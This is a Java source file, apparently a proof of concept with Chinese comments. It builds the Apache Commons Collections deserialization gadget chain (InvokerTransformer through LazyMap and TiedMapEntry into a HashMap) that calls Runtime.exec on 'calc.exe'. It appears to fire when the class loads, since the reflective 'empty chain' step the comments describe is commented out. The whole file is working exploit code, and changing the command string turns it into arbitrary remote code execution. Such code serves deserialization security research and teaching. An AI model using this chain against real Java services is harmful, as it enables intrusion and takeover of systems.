package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

public class PayloadClass implements Serializable {
    static {

        //命令数组
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"})
        };
        //保持chainedTransformer为空
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "test");

        /*
         * 为避免在构建利用链（chainedTransformer）对象时触发漏洞，选择先构建空链，然后将再
         * payload（transformers）通过反射的方式加载到空利用链对象的成员属性iTransformers上。
         * */
//        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
//        field.setAccessible(true);
//        field.set(chainedTransformer, transformers);


        //清空lazyMap中所有键/值对（并不会对iTransformers有影响）
        lazyMap.clear();
    }
}
